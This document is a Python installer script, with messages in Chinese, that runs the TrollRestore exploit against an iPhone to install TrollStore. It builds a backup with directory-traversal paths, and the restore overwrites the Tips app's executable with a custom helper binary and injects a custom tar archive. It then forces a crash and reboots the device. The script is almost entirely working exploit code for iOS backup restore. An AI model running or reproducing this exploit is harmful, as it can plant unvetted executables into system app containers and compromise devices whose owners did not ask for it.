#!/usr/bin/env python3
import sys
sys.path.append("installer")
import time
import requests
from pathlib import Path
from pymobiledevice3.usbmux import list_devices
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from sparserestore import backup, perform_restore

def get_device_selection():
    """
    列出所有设备并让用户选择
    """
    print("[*] 正在扫描设备...")
    devices = list_devices()
    
    if not devices:
        print("[-] 未检测到设备，请确保手机已连接并信任电脑。")
        sys.exit(1)
        
    if len(devices) == 1:
        print(f"[+] 自动选择唯一设备: {devices[0].serial} ({devices[0].connection_type})")
        return devices[0].serial
        
    print("\n[?] 检测到多个设备，请选择目标设备:")
    for i, dev in enumerate(devices):
        print(f"  [{i+1}] 序列号: {dev.serial} (连接方式: {dev.connection_type})")
        
    while True:
        choice = input("\n请输入序号并回车: ")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                return devices[idx].serial
            else:
                print("[-] 序号无效，请重试。")
        except ValueError:
            print("[-] 输入无效，请输入数字。")

def main():
    print("=" * 50)
    print("      TrollStore 官方中文安装器 (TrollRestore Exploit)")
    print("=" * 50)
    
    # 1. 选择设备
    serial = get_device_selection()
    
    try:
        lockdown = create_using_usbmux(serial=serial)
        name = lockdown.get_value("DeviceName")
        version = lockdown.get_value("ProductVersion")
        print(f"[+] 已连接到: {name} (iOS {version})")
    except Exception as e:
        print(f"[-] 连接锁定服务失败: {e}")
        print("[-] 请确保您已在手机上点击了“信任”。")
        sys.exit(1)
        
    # 2. 准备 Helper (ECHelper - Lightweight)
    print("\n[*] 正在准备 Helper (ECHelper)...")
    # path to your built helper binary
    binary_path = Path("/Users/hh/Desktop/my/echelper/echelper") # Validated new build
    
    if not binary_path.exists():
        print(f"[-] 找不到 ECHelper 二进制文件: {binary_path}")
        print("[-] 请确保已编译 ECHelper")
        sys.exit(1)
        
    try:
        with open(binary_path, "rb") as f:
            binary_content = f.read()
        print(f"[+] 读取成功! 大小: {len(binary_content)} 字节")
    except Exception as e:
        print(f"[-] 读取失败: {e}")
        sys.exit(1)

    # 3. 查找目标 APP (Default: Tips, User Requested: Tips)
    # target_app_keyword = "Tips.app"
    target_app_keyword = "Tips.app" # 切换回 '提示'
    print(f"\n[*] 正在搜索目标应用: {target_app_keyword} ...")
    
    app_uuid = None
    app_path = None
    found_app_name = None
    
    try:
        inst_proxy = InstallationProxyService(lockdown)
        apps = inst_proxy.get_apps(application_type="System", calculate_sizes=False)
        
        for app_id, info in apps.items():
            path_str = info.get("Path", "")
            if target_app_keyword in path_str: 
                 app_path = Path(path_str)
                 app_uuid = app_path.parent.name
                 found_app_name = app_path.name
                 break
                 
        if not app_uuid:
            print(f"[-] 找不到 {target_app_keyword} 应用。")
            sys.exit(1)
            
        print(f"[+] 找到应用: {found_app_name} (UUID: {app_uuid})")
        
    except Exception as e:
        print(f"[-] 获取应用列表失败: {e}")
        sys.exit(1)

    # 4. 构建恶意备份
    print("\n[*] 正在构建利用相关数据 (TrollRestore)...")
    
    target_app_name = found_app_name
    target_binary_name = Path(target_app_name).stem # e.g. Tips.app -> Tips, Home.app -> Home

    # 1.5 扫描所有 Bundle 资源 (Frameworks, Assets, etc.)
    # 仅当它是完整 App Bundle 时才做 (ECMAIN.app), ECHelper 不需要
    resource_items = []
    
    # Check if binary is inside an .app directory
    is_app_bundle = ".app" in str(binary_path) and binary_path.parent.name.endswith(".app")
    
    if is_app_bundle:
        payload_dir = binary_path.parent # ECMAIN.app
        print(f"[*] 检测到 App Bundle，扫描资源文件: {payload_dir}")
        if payload_dir.exists() and payload_dir.is_dir():
            for path in payload_dir.rglob("*"):
                if path.name == ".DS_Store":
                    continue
                if path.name == "Info.plist":
                    continue
                if "_CodeSignature" in str(path):
                    continue
                if path.name == binary_path.name: # ECMAIN binary
                    continue
                    
                rel_path = path.relative_to(payload_dir)
                
                # Construct domain path
                domain_suffix = f"{target_app_name}/{rel_path}"
                full_domain = f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{domain_suffix}"
                
                if path.is_dir():
                    resource_items.append(
                        backup.Directory("", full_domain, owner=33, group=33)
                    )
                else:
                    try:
                        with open(path, "rb") as f:
                            content = f.read()
                        
                        resource_items.append(
                            backup.ConcreteFile("", full_domain, owner=33, group=33, contents=content, inode=0)
                        )
                    except Exception as e:
                        print(f"[-] Failed to read resource {path}: {e}")
        print(f"[*] 准备了 {len(resource_items)} 个资源文件进行注入")
    else:
        print("[*] 单一二进制模式 (ECHelper)，跳过资源注入。")


    # 构造 sparserestore 备份链
    backup_file_list = [
            backup.Directory("", "RootDomain"),
            backup.Directory("Library", "RootDomain"),
            backup.Directory("Library/Preferences", "RootDomain"),
            
            # 1. 将 helper 二进制写入临时位置 (Owner=33 Mobile, Executable)
            backup.ConcreteFile("Library/Preferences/temp_bin", "RootDomain", owner=33, group=33, mode=0o755, contents=binary_content, inode=0),
            
            # 2. 目录穿越到 App 容器
            backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{target_app_name}",
                owner=33, # Container dir usually mobile/33
                group=33,
            ),
            
            # 3. 覆盖主执行文件 (显式写入内容，避免硬链接潜在问题)
            backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{target_app_name}/{target_binary_name}",
                owner=33,
                group=33,
                mode=0o755,
                contents=binary_content,
                inode=0,
            ),
            
            # 4. 删除临时链接 (清理)
            backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp_bin",
                owner=501,
                group=501,
                contents=b"",
            ),
            
            # 5. 触发崩溃以强制刷新缓存
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
    ]
    
    # 插入资源文件 (在 crash 文件之前)
    if resource_items:
        for item in resource_items:
             backup_file_list.insert(-1, item)

    # PATCH: Inject ecmain.tar as TrollStore.tar into Tips/Home app bundle
    ecmain_tar_path = Path("ecmain.tar") # Located in root of workspace
    # User said "my ecmain.tar". I assume it is in CWD or downloads.
    # I will look for it.
    if ecmain_tar_path.exists():
        print(f"[*] Injecting custom {ecmain_tar_path} as TrollStore.tar...")
        with open(ecmain_tar_path, "rb") as f:
            tar_content = f.read()
        
        # Inject into container/AppName/TrollStore.tar
        tar_target_path = f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{target_app_name}/TrollStore.tar"
        
        backup_file_list.insert(-1, 
            backup.ConcreteFile("", tar_target_path, owner=33, group=33, contents=tar_content, inode=0)
        )
    else:
        print(f"[-] ecmain.tar not found at {ecmain_tar_path}. Use official download.")

    
    back_obj = backup.Backup(files=backup_file_list)
    
    # 5. 执行恢复
    print("\n[*] 开始注入 (设备将重启，请勿断开)...")
    try:
        perform_restore(back_obj, reboot=False)
    except Exception as e:
        if "crash_on_purpose" in str(e):
             # 这是预期的错误，说明恢复过程走到了最后一步
             pass
        elif "Find My" in str(e):
             print("\n[-] 错误: 必须关闭 '查找我的 iPhone' 才能进行恢复操作！")
             print("[-] 请去 设置 -> Apple ID -> 查找 -> 关闭查找我的 iPhone。")
             sys.exit(1)
        else:
             # 有些设备也会报错但其实成功了，继续尝试重启
             print(f"[-] 恢复过程遇到警告 (可能不影响): {e}")

    # 6. 重启设备
    print("[*] 正在触发设备重启...")
    try:
        diag = DiagnosticsService(lockdown)
        diag.restart()
        print("[+] 重启指令已发送。")
    except Exception as e:
        print(f"[-] 自动重启失败: {e}")
        print("[!] 请手动重启手机！")

    print("\n" + "=" * 50)
    print("   安装完成！")
    print("   1. 等待手机重启。")
    print("   2. 打开 '提示' (Tips) 应用。")
    print("   3. 点击 'Install TrollStore'。")
    print("=" * 50)

if __name__ == "__main__":
    main()
